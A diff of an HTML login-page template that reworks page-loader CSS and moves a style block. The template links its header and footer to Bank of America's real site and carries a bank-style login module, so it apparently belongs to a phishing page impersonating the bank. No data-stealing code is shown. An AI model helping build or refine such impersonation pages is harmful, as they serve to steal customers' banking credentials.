@@ -10,88 +10,24 @@
   <link rel="stylesheet" href="/css/main.css">
   <script src="/js/jquery.js"></script>
   <script src="/js/jquery.mask.min.js"></script>
-</head>
-
-<body>
-
-  <!-- HEADER -->
-  <a href="https://secure.bankofamerica.com/">
-    <header id="siteHeader" style="height: 80px;"></header>
-  </a>
-
-  <!-- PAGE LOADER (overlay covering everything except header/footer) -->
-  <div id="pageLoader">
-    <div class="loaderBox">
-      <div class="loader"></div>
-    </div>
-  </div>
-
-  <main class="col-small-up">
-    <div class="main-section flex-grid-nest">
-      <div class="cb-container">
-        <div class="row cb-collapse">
-          <div class="columns">
-            <div class="cb-login-module">
-              <div class="row">
-                <div class="column col-small errMsg" style="font:16px 'cb-regular';display: none;">
-                  <div class="cb-message error medium" tabindex="0">
-                    <div class="cb-message-icon">
-                      <span class="data-icon">
-                        <!-- SVG ICON HERE -->
-                      </span>
-                    </div>
-                    <div class="cb-message-content">
-                      <p class="cb-message-text">Please fill out all fields to continue.</p>
-                    </div>
-                    <div class="cb-message-dismiss">
-                      <span class="cb-message-close-x">
-                        <span aria-hidden="true">×</span>
-                        <span class="cb-hidden">close: error Message</span>
-                      </span>
-                    </div>
-                  </div>
-                </div>
-
-                @!section('content')
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </main>
-
-  <!-- FOOTER -->
-  <a href="https://secure.bankofamerica.com/">
-    <footer id="siteFooter" style="height: 60px;"></footer>
-  </a>
-
-  <!-- JS -->
-  <script src="/js/main.js"></script>
-  @!section('script')
-  <script>
-    $(window).on("load", function () {
-      $("#pageLoader").fadeOut(400);
-    });
-  </script>
-
-  <!-- PAGE LOADER CSS -->
   <style>
-    /* Overlay covering everything except header and footer */
+    /* ===== PAGE LOADER ===== */
+    /* Overlay covering everything except header/footer */
     #pageLoader {
-      position: absolute;
-      top: 80px; /* height of header */
-      bottom: 60px; /* height of footer */
+      position: fixed;        /* fixed to viewport */
+      top: 80px;              /* height of header */
+      bottom: 60px;           /* height of footer */
       left: 0;
-      right: 0;
+      width: 100vw;           /* full viewport width */
       background: #ffffff;
       z-index: 99999;
+      overflow: hidden;
     }
 
-    /* Center spinner in remaining space */
+    /* Center spinner in overlay */
     .loaderBox {
       position: absolute;
-      top: 50%; /* vertical center between header/footer */
+      top: 50%;               /* center vertically in remaining space */
       left: 50%;
       transform: translate(-50%, -50%);
     }
@@ -130,7 +66,71 @@
       }
     }
   </style>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <a href="https://secure.bankofamerica.com/">
+    <header id="siteHeader" style="height: 80px;"></header>
+  </a>
+
+  <!-- PAGE LOADER (overlay covering all content except header/footer) -->
+  <div id="pageLoader">
+    <div class="loaderBox">
+      <div class="loader"></div>
+    </div>
+  </div>
+
+  <main class="col-small-up">
+    <div class="main-section flex-grid-nest">
+      <div class="cb-container">
+        <div class="row cb-collapse">
+          <div class="columns">
+            <div class="cb-login-module">
+              <div class="row">
+                <div class="column col-small errMsg" style="font:16px 'cb-regular';display: none;">
+                  <div class="cb-message error medium" tabindex="0">
+                    <div class="cb-message-icon">
+                      <span class="data-icon">
+                        <!-- SVG ICON -->
+                      </span>
+                    </div>
+                    <div class="cb-message-content">
+                      <p class="cb-message-text">Please fill out all fields to continue.</p>
+                    </div>
+                    <div class="cb-message-dismiss">
+                      <span class="cb-message-close-x">
+                        <span aria-hidden="true">×</span>
+                        <span class="cb-hidden">close: error Message</span>
+                      </span>
+                    </div>
+                  </div>
+                </div>
+
+                @!section('content')
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <a href="https://secure.bankofamerica.com/">
+    <footer id="siteFooter" style="height: 60px;"></footer>
+  </a>
+
+  <!-- JS -->
+  <script src="/js/main.js"></script>
+  @!section('script')
+  <script>
+    $(window).on("load", function () {
+      $("#pageLoader").fadeOut(400);
+    });
+  </script>
 
 </body>
 
-</html> 
+</html>
